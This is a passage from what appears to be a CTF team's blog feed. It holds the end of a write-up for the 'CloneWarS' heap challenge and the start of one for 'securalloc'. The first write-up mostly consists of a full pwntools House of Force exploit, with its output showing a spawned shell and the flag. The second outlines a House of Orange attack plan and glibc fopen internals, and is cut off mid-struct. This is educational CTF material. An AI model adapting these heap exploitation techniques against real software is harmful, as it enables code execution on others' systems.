inspected/selected chunk */</span></span><br><span class="line">  INTERNAL_SIZE_T size;             <span class="comment">/* its size */</span></span><br><span class="line">  <span class="keyword">int</span>             victim_index;     <span class="comment">/* its bin index */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr       remainder;        <span class="comment">/* remainder from a split */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span>   remainder_size;   <span class="comment">/* its size */</span></span><br><span class="line"></span><br><span class="line">  [...]</span><br><span class="line"></span><br><span class="line">  checked_request2size(bytes, nb);</span><br><span class="line"></span><br><span class="line">  [...]</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* finally, do the allocation */</span></span><br><span class="line">  p = av-&gt;top;</span><br><span class="line">  size = chunksize (p);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* check that one of the above allocation paths succeeded */</span></span><br><span class="line">  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">    &#123;</span><br><span class="line">      remainder_size = size - nb;</span><br><span class="line">      remainder = chunk_at_offset (p, nb);</span><br><span class="line">      av-&gt;top = remainder;</span><br><span class="line">      set_head (p, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">      set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">      check_malloced_chunk (av, p, nb);</span><br><span class="line">      <span class="keyword">return</span> chunk2mem (p);</span><br><span class="line">    &#125;</span><br><span class="line">    [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Perhaps, if you can override with size to a large value, you can easily pass this verification, we can do this with an overflow vulnerability to tamper the top_chunk size.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE)</span><br></pre></td></tr></table></figure><p>In the <a href="https://packetstormsecurity.com/files/40638/MallocMaleficarum.txt.html" target="_blank" rel="noopener">Malloc Maleficarum</a> it is written that the wilderness chunk should have the highest size possible (preferably 0xFFFFFFFFFFFFFFFF) which is the largest number in unsigned long in x64. </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Treat space at ptr + offset as a chunk */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))</span></span><br><span class="line"></span><br><span class="line">remainder = chunk_at_offset (p, nb);</span><br><span class="line">av-&gt;top = remainder;</span><br></pre></td></tr></table></figure><p>After that, the top pointer will be updated, and the next heap block will be allocated to this location.</p><h3 id="Writing-the-exploit"><a href="#Writing-the-exploit" class="headerlink" title="Writing the exploit"></a>Writing the exploit</h3><p>The first thing is find a way to connect with <strong>SSH</strong> to connect to the server I did that with:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">r =process(<span class="string">"sshpass -p 12345678 ssh -p 7000 -tt yeet@ctf2.kaf.sh"</span>.split())</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>You need to have sshpass installed tho and also you need to add the server ip to the known hosts before which can be done by saying yes while connecting for the first time via command line:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh -p 7000 yeet@ctf2.kaf.sh</span><br></pre></td></tr></table></figure><p>First we need to get a HEAP address leak we can get this by executing <strong>R2D2</strong> option:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">r2d2</span><span class="params">(n)</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">'Your choice: '</span>, <span class="string">'2'</span>)</span><br><span class="line">r.sendlineafter(<span class="string">'R2? '</span>, <span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pstarships</span><span class="params">(size, kind, capacity)</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">'Your choice: '</span>, <span class="string">'3'</span>)</span><br><span class="line">r.sendlineafter(<span class="string">'Master, the amount of starships: '</span>, str(size))</span><br><span class="line">r.sendlineafter(<span class="string">'What kind of starships?: '</span>, kind)</span><br><span class="line">r.sendlineafter(<span class="string">'Capacity of troopers in the starships: '</span>, str(capacity))</span><br><span class="line">r = getConn()</span><br><span class="line">pstarships(<span class="number">0x30</span>, <span class="string">'A'</span>, <span class="number">0x30</span>)</span><br><span class="line">r2d2(<span class="number">-1</span>)</span><br><span class="line">r.recvuntil(<span class="string">'R2D2 IS .... '</span>)</span><br><span class="line">HEAP_L = int(r.recvregex(<span class="string">r'(\d+) '</span>))</span><br></pre></td></tr></table></figure><p>Next step is to tamper the size of the wilderness with <strong>pstartships</strong> via <strong>memset</strong>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># OVERFLOW TOP_CHUNK</span></span><br><span class="line">pstarships(<span class="number">0x30</span>, <span class="string">"FF"</span>, <span class="number">0x40</span>) <span class="comment"># Overflow Top Chunk</span></span><br></pre></td></tr></table></figure><p>The top_chunk <strong>before</strong> overflow:<br><a data-fancybox="gallery" href="https://i.imgur.com/yjDhd1Q.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/yjDhd1Q.png" alt><br></a><br>The top_chunk <strong>after</strong> overflow:<br><a data-fancybox="gallery" href="https://i.imgur.com/aye3eSP.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/aye3eSP.png" alt><br></a><br>Now the place we want to write is at <strong>FILE</strong> global string pointer we can do this by going to the darkside(<strong>cm2_dark_side</strong>):</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># LEAK FILE PTR</span></span><br><span class="line">r.sendlineafter(<span class="string">'Your choice: '</span>, <span class="string">'6'</span>)</span><br><span class="line">r.recvuntil(<span class="string">'File is at: '</span>)</span><br><span class="line">FILE = int(r.recvline().rstrip())</span><br><span class="line">log.info(<span class="string">"FILE ADDR 0x%x"</span> % FILE)</span><br></pre></td></tr></table></figure><p>Now we calculate the <strong>evilsize</strong> required to write at <strong>FILE</strong> can be done with <strong>FILE-TOP_CHUNK-8*4</strong>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HEAP = HEAP_L<span class="number">-0x1380</span> <span class="comment"># HEAPBASE</span></span><br><span class="line">SIZE_OF_LONG = <span class="number">0x8</span> <span class="comment"># sizeof(long) -&gt; 8 in 64 bits</span></span><br><span class="line">WILD_OFFSET = <span class="number">0x12e0</span> <span class="comment"># Current TOP_CHUNK offset</span></span><br><span class="line">TOP_CHUNK = HEAP+WILD_OFFSET+SIZE_OF_LONG*<span class="number">4</span></span><br><span class="line">r.sendlineafter(<span class="string">'Your choice: '</span>, <span class="string">'1'</span>)</span><br><span class="line">buildDeathStar(FILE-TOP_CHUNK) <span class="comment"># Malloc will return an arbitrary pointer to FILE</span></span><br></pre></td></tr></table></figure><p>To calculate WILD_OFFSET you can put a break point right before <strong>malloc</strong> inside <strong>buildDeathStar</strong> and calculate with this:<br><a data-fancybox="gallery" href="https://i.imgur.com/pDDp6Os.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/pDDp6Os.png" alt><br></a><br>Write <strong>sh</strong> into file:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">r.sendlineafter(<span class="string">'Your choice: '</span>, <span class="string">'4'</span>)</span><br><span class="line">r.sendlineafter(<span class="string">'What kind of troopers?: '</span>, <span class="string">'sh'</span>) <span class="comment"># Modify file with sh</span></span><br><span class="line">r.sendlineafter(<span class="string">'Your choice: '</span>, <span class="string">'6'</span>) <span class="comment"># Trigger system("sh")</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>The full exploit:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">filename = <span class="string">"./CloneWarS"</span></span><br><span class="line">elf = ELF(filename)</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> process(filename) <span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">else</span> process(<span class="string">"sshpass -p 12345678 ssh -p 7000 -tt yeet@ctf2.kaf.sh"</span>.split())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_PIE</span><span class="params">(proc)</span>:</span></span><br><span class="line">    memory_map = open(<span class="string">"/proc/&#123;&#125;/maps"</span>.format(proc.pid),<span class="string">"rb"</span>).readlines()</span><br><span class="line">    <span class="keyword">return</span> int(memory_map[<span class="number">0</span>].split(<span class="string">"-"</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(bp)</span>:</span></span><br><span class="line">    script = <span class="string">""</span></span><br><span class="line">    PIE = get_PIE(r)</span><br><span class="line">    PAPA = PIE</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> bp:</span><br><span class="line">        script += <span class="string">"b *0x%x\n"</span>%(PIE+x)</span><br><span class="line">    gdb.attach(r,gdbscript=script)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">r2d2</span><span class="params">(n)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'Your choice: '</span>, <span class="string">'2'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'R2? '</span>, <span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pstarships</span><span class="params">(size, kind, capacity)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'Your choice: '</span>, <span class="string">'3'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Master, the amount of starships: '</span>, str(size))</span><br><span class="line">    r.sendlineafter(<span class="string">'What kind of starships?: '</span>, kind)</span><br><span class="line">    r.sendlineafter(<span class="string">'Capacity of troopers in the starships: '</span>, str(capacity))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lightsabers</span><span class="params">(nLs, color)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'Your choice: '</span>, <span class="string">'5'</span>)</span><br><span class="line">    r.sendafter(<span class="string">'How many lightsabers do you think you will need?: '</span>, <span class="string">'\n'</span>)</span><br><span class="line">    r.sendline(str(nLs))</span><br><span class="line">    r.sendafter(<span class="string">'What color would you like on your light sabers: '</span>, color)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buildDeathStar</span><span class="params">(size)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'Your choice: '</span>, <span class="string">'1'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Assemble death star: '</span>,str(size))</span><br><span class="line">    </span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'new-window'</span>]</span><br><span class="line">r = getConn()</span><br><span class="line"></span><br><span class="line"><span class="comment"># LEAKING HEAP</span></span><br><span class="line">pstarships(<span class="number">0x30</span>, <span class="string">'A'</span>, <span class="number">0x30</span>)</span><br><span class="line">r2d2(<span class="number">-1</span>)</span><br><span class="line">r.recvuntil(<span class="string">'R2D2 IS .... '</span>)</span><br><span class="line">HEAP_L = int(r.recvregex(<span class="string">r'(\d+) '</span>))</span><br><span class="line">log.info(<span class="string">'HEAP ADDR 0x%x'</span>% HEAP_L)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">and</span> args.GDB:</span><br><span class="line">    debug([<span class="number">0xB0F</span>,<span class="number">0xC3C</span>,<span class="number">0xA7D</span>, <span class="number">0xE00</span>]) <span class="comment"># 0xD94</span></span><br><span class="line"><span class="comment"># OVERFLOW TOP_CHUNK</span></span><br><span class="line">pstarships(<span class="number">0x30</span>, <span class="string">"FF"</span>, <span class="number">0x40</span>) <span class="comment"># Overflow Top Chunk</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># LEAK FILE PTR</span></span><br><span class="line">r.sendlineafter(<span class="string">'Your choice: '</span>, <span class="string">'6'</span>)</span><br><span class="line">r.recvuntil(<span class="string">'File is at: '</span>)</span><br><span class="line">FILE = int(r.recvline().rstrip())</span><br><span class="line">log.info(<span class="string">"FILE ADDR 0x%x"</span> % FILE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HEAP = HEAP_L<span class="number">-0x1380</span> <span class="comment"># HEAPBASE</span></span><br><span class="line">SIZE_OF_LONG = <span class="number">0x8</span> <span class="comment"># sizeof(long) -&gt; 8 in 64 bits</span></span><br><span class="line">WILD_OFFSET = <span class="number">0x12e0</span> <span class="comment"># Current TOP_CHUNK offset</span></span><br><span class="line">TOP_CHUNK = HEAP+WILD_OFFSET+SIZE_OF_LONG*<span class="number">4</span></span><br><span class="line">r.sendlineafter(<span class="string">'Your choice: '</span>, <span class="string">'1'</span>)</span><br><span class="line">buildDeathStar(FILE-TOP_CHUNK) <span class="comment"># Calculate the evil size required to write to FILE</span></span><br><span class="line">r.sendlineafter(<span class="string">'Your choice: '</span>, <span class="string">'4'</span>)</span><br><span class="line">r.sendlineafter(<span class="string">'What kind of troopers?: '</span>, <span class="string">'sh'</span>) <span class="comment"># Modify file with sh</span></span><br><span class="line">r.sendlineafter(<span class="string">'Your choice: '</span>, <span class="string">'6'</span>) <span class="comment"># Trigger system("sh")</span></span><br><span class="line">r.interactive()</span><br><span class="line">r.close()</span><br></pre></td></tr></table></figure><p>Running it:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ python CloneWarS.py REMOTE</span><br><span class="line">[+] Starting local process <span class="string">'/usr/bin/sshpass'</span>: pid <span class="number">113679</span></span><br><span class="line">[*] HEAP ADDR <span class="number">0x555555757780</span></span><br><span class="line">[*] FILE ADDR <span class="number">0x555555756010</span></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"><span class="number">6</span></span><br><span class="line"></span><br><span class="line">File <span class="keyword">is</span> at: <span class="number">93824994336784</span></span><br><span class="line">$ $ ls</span><br><span class="line">ls</span><br><span class="line">binary    flag.txt  skywalker.txt</span><br><span class="line">$ $ cat flag.txt</span><br><span class="line">cat flag.txt</span><br><span class="line">KAF&#123;MaY_tHe_F0RCE_B3_W1tH_YOUUU10293012884&#125;</span><br></pre></td></tr></table></figure><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ul><li><a href="https://gbmaster.wordpress.com/2015/06/28/x86-exploitation-101-house-of-force-jedi-overflow/" target="_blank" rel="noopener">gbmaster</a></li><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force/" target="_blank" rel="noopener">ctfwiki</a></li><li><a href="https://github.com/erosjohn/how2heap/blob/master/glibc_2.25/house_of_force.c" target="_blank" rel="noopener">how2heap</a></li></ul><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;CloneWarS&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Points&lt;/strong&gt;&lt;br&gt;90&lt;br&gt;&lt;strong&gt;Solves&lt;/strong&gt;&lt;br&gt;13&lt;br&gt;&lt;strong&gt;Category&lt;/strong
      
    
    </summary>
    
      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
    
      <category term="x64" scheme="https://teamrocketist.github.io/categories/Pwn/x64/"/>
    
      <category term="Glibc Malloc" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/"/>
    
      <category term="House of Force" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/House-of-Force/"/>
    
      <category term="Heap Overflow" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Heap-Overflow/"/>
    
    
      <category term="heap_overflow" scheme="https://teamrocketist.github.io/tags/heap-overflow/"/>
    
      <category term="kidpod2019" scheme="https://teamrocketist.github.io/tags/kidpod2019/"/>
    
  </entry>
  
  <entry>
    <title>[Pwn] Asis Finals 2019 - securalloc</title>
    <link href="https://teamrocketist.github.io/2019/11/18/Pwn-Asis-Finals-2019-securalloc/"/>
    <id>https://teamrocketist.github.io/2019/11/18/Pwn-Asis-Finals-2019-securalloc/</id>
    <published>2019-11-18T03:01:32.000Z</published>
    <updated>2022-08-23T00:14:55.165Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><strong>Securalloc</strong></p><p><strong>Points</strong><br>167<br><strong>Solves</strong><br>26<br><strong>Category</strong><br>Warm-up Pwnable</p><p><strong>Description:</strong><br>   The key to success in the battlefield is always the secure allocation of resources!<br>   nc 76.74.177.238 9001<br><a href="https://mega.nz/#!66gEnSqY!jbbsnDzwmsWrcoYCKWH--DIUgxtw9vY78xd9SDbbrnU" target="_blank" rel="noopener">libc.so.6</a><br><a href="https://mega.nz/#!nvoUCSpC!6oZlBoV-aMf1AZ5gWiUBE7NciCjFZcyFlrsoOvL6Phk" target="_blank" rel="noopener">libsalloc.so</a><br><a href="https://mega.nz/#!X7pgWapT!dTz-MRybB52k_3sX8F1N9lqKyejSE0JrxUmRO-XK6RU" target="_blank" rel="noopener">securalloc.elf</a></p></blockquote><h3 id="TLDR"><a href="#TLDR" class="headerlink" title="TLDR"></a>TLDR</h3><ul><li>Leak libc from _IO_2_1_stderr leftover</li><li>Leak heap from _IO_2_1_stderr leftover </li><li>Leak heap canary from /dev/random leftover</li><li>Apply House of Orange and get a shell.</li></ul><h3 id="Extract-information"><a href="#Extract-information" class="headerlink" title="Extract information"></a>Extract information</h3><p>We have an extra shared library <strong>libsalloc.so</strong> to analyse but first lets check the security on <strong>securalloc.elf</strong>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec securalloc.elf</span><br><span class="line">[*] <span class="string">'/ctf/asis2019/pwn/securalloc/securalloc.elf'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p><strong>Full RELRO</strong> is enabled so <strong>GOT</strong> is read only this is something that we always should take in mind before proceeding any further.</p><h3 id="Identifying-the-vulnerability"><a href="#Identifying-the-vulnerability" class="headerlink" title="Identifying the vulnerability"></a>Identifying the vulnerability</h3><p>Now lets check for a vulnerability :<br><a data-fancybox="gallery" href="https://i.imgur.com/QEhVqwT.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/QEhVqwT.png" alt><br></a></p><h3 id="Elf-analysis"><a href="#Elf-analysis" class="headerlink" title="Elf analysis"></a>Elf analysis</h3><p>Like other heap challenges we will have the classic functions <strong>print</strong>, <strong>create</strong>, <strong>delete</strong> and <strong>edit</strong> but this time we have an additional shared library named <strong>libsalloc.so</strong> and the functions used from it are:</p><p><strong>secureinit</strong><br><a data-fancybox="gallery" href="https://i.imgur.com/yemgy3d.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/yemgy3d.png" alt><br></a></p><p>Opening <strong>libsalloc.so</strong> in ida we can see it uses <strong>fopen</strong> to open <strong>/dev/urandom</strong> to create a canary:<br><a data-fancybox="gallery" href="https://i.imgur.com/mEJy0Zl.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/mEJy0Zl.png" alt><br></a></p><p>And why this is bad ? Looking at <a href="https://github.com/lattera/glibc/blob/895ef79e04a953cac1493863bcae29ad85657ee1/libio/iofopen.c#L65" target="_blank" rel="noopener">fopen internals</a>:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">FILE *</span><br><span class="line">__fopen_internal (<span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">const</span> <span class="keyword">char</span> *mode, <span class="keyword">int</span> is32)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">locked_FILE</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> <span class="title">fp</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">    _IO_lock_t lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> <span class="title">wd</span>;</span></span><br><span class="line">  &#125; *new_f = (struct locked_FILE *) <span class="built_in">malloc</span> (<span class="keyword">sizeof</span> (struct locked_FILE)); <span class="comment">// malloc call here</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (new_f == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  new_f-&gt;fp.file._lock = &amp;new_f-&gt;lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_no_init (&amp;new_f-&gt;fp.file, <span class="number">0</span>, <span class="number">0</span>, &amp;new_f-&gt;wd, &amp;_IO_wfile_jumps);</span><br><span class="line">  _IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps;</span><br><span class="line">  _IO_new_file_init_internal (&amp;new_f-&gt;fp);</span><br><span class="line">  <span class="keyword">if</span> (_IO_file_fopen ((FILE *) new_f, filename, mode, is32) != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> __fopen_maybe_mmap (&amp;new_f-&gt;fp.file);</span><br><span class="line"></span><br><span class="line">  _IO_un_link (&amp;new_f-&gt;fp);</span><br><span class="line">  <span class="built_in">free</span> (new_f); <span class="comment">// free call here</span></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>So a malloc of <strong>struct locked_FILE</strong> is executed, this struct will store <strong>IO_FILE</strong> pointers and the <strong>/dev/urandom</strong> data.</p><p><strong>struct _IO_FILE_plus</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* We always allocate an extra word following an _IO_FILE.</span></span><br><span class="line"><span class="comment">   This contains a pointer to the function jump table used.</span></span><br><span class="line"><span class="comment">   This is for compatibility with C++ streambuf; the word can</span></span><br><span class="line"><span class="comment">   be used to smash to a pointer to a virtual function table. */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  FILE file;</span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>Look in memory after running <strong>fopen</strong>:<br><a data-fancybox="gallery" href="https://i.imgur.com/YycUFqi.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/YycUFqi.png" alt><br></a><br><strong>struct _IO_wide_data</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Extra data for wide character streams.  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_read_ptr;<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_read_end;<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_read_base;<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_write_base;<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_write_ptr;<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_write_end;<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_buf_base;<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_buf_end;<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_save_base;<span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_backup_base;<span class="comment">/* Pointer to first valid character of</span></span><br><span class="line"><span class="comment">   backup area */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_save_end;<span class="comment">/* Pointer to end of 